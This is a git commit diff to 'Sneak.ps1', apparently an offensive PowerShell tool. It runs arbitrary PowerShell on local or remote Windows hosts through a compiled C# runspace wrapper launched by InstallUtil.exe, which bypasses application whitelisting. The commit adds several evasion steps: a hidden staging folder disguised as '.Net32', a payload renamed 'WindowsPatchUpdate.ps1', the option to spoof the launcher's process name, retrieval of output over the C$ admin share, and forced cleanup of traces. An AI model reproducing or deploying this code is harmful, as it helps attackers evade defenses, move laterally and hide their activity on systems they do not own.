071eb1a4f1d03880faaebb05a0a2f8e146b2fbee
skaldragon <37670954+skaldragon@users.noreply.github.com>
2018-10-29 14:29:20 -1000

    Fixed remoting capability and retrieval

--- Sneak.ps1
+++ Sneak.ps1
@@ -18,7 +18,9 @@ options
 -Spoofname         Process you want to spoof as(run with spoof switch)
 -Credential        User you want to run the command as
 -RunRemote         Runs the commands remotely
--Spoof             Spoofs the process as the chosen Spoofname" -ForegroundColor Yellow
+-Spoof             Spoofs the process as the chosen Spoofname
+-Outfilename       The name of the file you want to output to(not path) used with Out switch if required output
+-Out               Outputs results to local host" -ForegroundColor Yellow
 
 
 function Sneak{
@@ -47,7 +49,11 @@ param(
 [validatenotnull()] [string]$Spoofname,
 [parameter(ParameterSetname="Remote")]
 [parameter(ParameterSetname="Local")]
-[switch]$Spoof
+[switch]$Spoof,
+[parameter(ParameterSetname="Remote")]
+[string]$Outfilename,
+[parameter(ParameterSetname="Remote")]
+[switch]$Out
 )
 $realpath="C:\Windows\Microsoft.NET\Framework64\v2.0.50727\"
 $pathcheck1=Test-Path "$realpath\csc.exe"
@@ -59,6 +65,8 @@ else{
 Write-Host "Sorry you don't have the necessary files to do this operarion" -ForegroundColor Red
 break;
 }
+$hiddenpath="C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32"
+$hiddenpath2="C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\"
 Import-Module -Name $filepath
 if($testconnection){
 if(Test-Connection -ComputerName $remotemachine -Count 4){
@@ -83,14 +91,22 @@ Write-Host "You have a session open"
 } #End Else
 
 #This is where it starts to create the C script and executable for the execution of the function
+$creduser=($Creds).UserName
+Invoke-Command -Session $session{New-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\" -ItemType directory;$change=Get-item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32";
+$change.Attributes="hidden"}
 $filebytes=Get-Content -Path $filepath -Encoding Byte
-Invoke-Command -Session $session {[system.io.file]::WriteAllBytes("$using:filepath",$using:filebytes)}
+Invoke-Command -Session $session{New-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\WindowsPatchUpdate.ps1" -ItemType file}
+Invoke-Command -Session $session {[system.io.file]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\WindowsPatchUpdate.ps1",$using:filebytes)}
+if($Out){
+$Functioncommand+="`|Out-File -Filepath C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\$Outfilename"
+invoke-command -Session $session {Add-Content -Value $using:Functioncommand -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\WindowsPatchUpdate.ps1";}
+}
+else{
+invoke-command -Session $session {Add-Content -Value $using:Functioncommand -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\WindowsPatchUpdate.ps1";}
+}
 
-
-
-
-$itempath="C:\Users\$env:username\Desktop\standardfile.cs"
-invoke-command -Session $session{ New-Item -Path "C:\Users\$env:username\Desktop\standardfile.cs" -ItemType file -Value "using System;
+$itempath="$hiddenpath2\standardfile.cs"
+invoke-command -Session $session{ New-Item -Path "$using:itempath" -ItemType file -Value "using System;
  using System.Configuration.Install;
  using System.Runtime.InteropServices;
  using System.Management.Automation.Runspaces;
@@ -112,7 +128,7 @@ invoke-command -Session $session{ New-Item -Path "C:\Users\$env:username\Desktop
  {
  public static void Exec()
  {
- string command = System.IO.File.ReadAllText(@`"$using:filepath`");
+ string command = System.IO.File.ReadAllText(@`"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\WindowsPatchUpdate.ps1`");
  RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
  Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
  rspace.Open();
@@ -122,33 +138,46 @@ invoke-command -Session $session{ New-Item -Path "C:\Users\$env:username\Desktop
  }
  }
  "}
-
-invoke-command -Session $session {Add-Content -Value $using:Functioncommand -Path $using:filepath;}
-
+ 
 invoke-command -Session $session{ cd $using:realpath}
-$command="cmd.exe /C csc.exe/r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:`"C:\Users\$env:username\Desktop\standardfile.exe`" `"$itempath`""
+$command="cmd.exe /C csc.exe/r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:`"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\standardfile.exe`" `"$itempath`""
 Invoke-Command -Session $session{ Invoke-Expression -Command $using:command}
 
 if($Spoof){
 $SpoofContent=Get-Content -Path "$realpath\installutil.exe" -Encoding Byte
-invoke-command -Session $session{ [System.IO.File]::WriteAllBytes("C:\users\$env:username\desktop\$using:Spoofname",$using:SpoofContent)}
-invoke-command -Session $session{ cd C:\users\$env:username\desktop}
-$command2="cmd.exe /C $spoofname /logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\users\$env:username\desktop\standardfile.exe`" "
+invoke-command -Session $session{ [System.IO.File]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\$using:Spoofname",$using:SpoofContent)}
+invoke-command -Session $session{ cd C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\}
+$command2="cmd.exe /C $spoofname /logfile=C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\log.txt /LogToConsole=false /U `"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\standardfile.exe`" "
 Invoke-Command -Session $session {Invoke-Expression -Command $using:command2}
-Invoke-Command -Session $session {Remove-Item -Path C:\Users\$env:username\desktop\standardfile.cs;Remove-Item -Path C:\Users\$env:username\desktop\standardfile.exe;Remove-Item -Path $using:filepath;Remove-Item -Path C:\users\$env:username\desktop\log.txt;Remove-item -Path C:\users\$env:username\desktop\$using:spoofname}
+New-Item -Path C:\Users\$env:username\Desktop\sneakitems -ItemType directory
+$creduser=($Creds).username
+Copy-Item -Path \\$Remotemachine\c$\users\$creduser\AppData\Roaming\Microsoft\Windows\.NET32\Sneak\$Outfilename -Destination C:\Users\$env:username\Desktop\sneakitems
+write-host "Cleaning up[+]" -ForegroundColor Green
+Invoke-Command -Session $session{cd C:\Users}
+sleep -s 15
+Invoke-Command -Session $session {Remove-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32" -Recurse -Force}
 }
 else{
 $command2="cmd.exe /C InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\users\$env:username\desktop\standardfile.exe`" "
 Invoke-Command -Session $session {Invoke-Expression -Command $using:command2}
-Invoke-Command -Session $session {Remove-Item -Path C:\Users\$env:username\desktop\standardfile.cs;Remove-Item -Path C:\Users\$env:username\desktop\standardfile.exe;Remove-Item -Path $using:filepath;Remove-Item -Path C:\users\$env:username\desktop\log.txt}
+New-Item -Path C:\Users\$env:username\Desktop\sneakitems -ItemType directory
+$creduser=($Creds).username
+Copy-Item -Path \\$Remotemachine\c$\users\$creduser\AppData\Roaming\Microsoft\Windows\.NET32\Sneak\$Outfilename -Destination C:\Users\$env:username\Desktop\sneakitems
+write-host "Cleaning up[+]" -ForegroundColor Green
+Invoke-Command -Session $session{cd C:\Users}
+sleep -s 15
+Invoke-Command -Session $session {Remove-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32" -Recurse -Force}
 }#EndElse
 Remove-pssession -Computername $Remotemachine
 }#End RunRemote
 
 
 if($LocalHostRan){
-$itempath="C:\Users\$env:username\Desktop\standardfile.cs"
-New-Item -Path "C:\Users\$env:username\Desktop\standardfile.cs" -ItemType File -Value "using System;
+New-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\" -ItemType directory
+$change=Get-item -Path $hiddenpath;
+$change.Attributes="hidden"
+$itempath="$hiddenpath2\standardfile.cs"
+New-Item -Path "$hiddenpath2\standardfile.cs" -ItemType File -Value "using System;
  using System.Configuration.Install;
  using System.Runtime.InteropServices;
  using System.Management.Automation.Runspaces;
@@ -184,20 +213,23 @@ New-Item -Path "C:\Users\$env:username\Desktop\standardfile.cs" -ItemType File -
 Add-Content -Value $Functioncommand -Path $filepath;
 
 cd $realpath
-$command="cmd.exe /C csc.exe/r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:`"C:\Users\$env:username\Desktop\standardfile.exe`" `"$itempath`""
+$command="cmd.exe /C csc.exe/r:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /unsafe /platform:anycpu /out:`"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\standardfile.exe`" `"$itempath`""
 Invoke-Expression -Command $command
 
 if($Spoof){
 $SpoofContent=Get-Content -Path "$realpath\installutil.exe" -Encoding Byte
-[System.IO.File]::WriteAllBytes("C:\users\$env:username\desktop\$Spoofname",$SpoofContent)
-cd C:\users\$env:username\desktop
-$command2="cmd.exe /C $spoofname /logfile=`"C:\Users\$env:username\Desktop\log.txt`" /LogToConsole=false /U `"C:\users\$env:username\desktop\standardfile.exe`" "
+[System.IO.File]::WriteAllBytes("C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\$Spoofname",$SpoofContent)
+cd C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak
+$command2="cmd.exe /C $spoofname /logfile=`"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\log.txt`" /LogToConsole=false /U `"C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32\Sneak\standardfile.exe`" "
 Invoke-Expression -Command $command2
 $removalstuff=Get-Content -Path $filepath | Out-String
 $removalstuff=$removalstuff.Replace("$Functioncommand","")
 Clear-Content -Path $filepath
 Add-Content -Path $filepath -Value $removalstuff
-Remove-Item -Path "C:\Users\$env:username\desktop\standardfile.cs";Remove-Item -Path "C:\Users\$env:username\desktop\standardfile.exe";Remove-Item -Path "C:\users\$env:username\desktop\log.txt";Remove-item -Path "C:\users\$env:username\desktop\$spoofname"
+Write-Host "Cleaning up [+]" -ForegroundColor Gray
+cd C:\Users
+sleep -s 15
+Remove-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32" -Recurse -Force
 }#End Spoof
 
 else{
@@ -208,7 +240,10 @@ $removalstuff=Get-Content -Path $filepath | Out-String
 $removalstuff=$removalstuff.Replace("$Functioncommand","")
 Clear-Content -Path $filepath
 Add-Content -Path $filepath -Value $removalstuff
-Remove-Item -Path "C:\Users\$env:username\desktop\standardfile.cs";Remove-Item -Path "C:\Users\$env:username\desktop\standardfile.exe";Remove-Item -Path "C:\users\$env:username\desktop\log.txt";
+Write-Host "Cleaning up [+]" -ForegroundColor Gray
+cd C:\Users
+sleep -s 15
+Remove-Item -Path "C:\users\$env:username\AppData\Roaming\Microsoft\Windows\.Net32" -Recurse -Force
 } #End else
 }#End LocalHostRan
 }#End Sneak
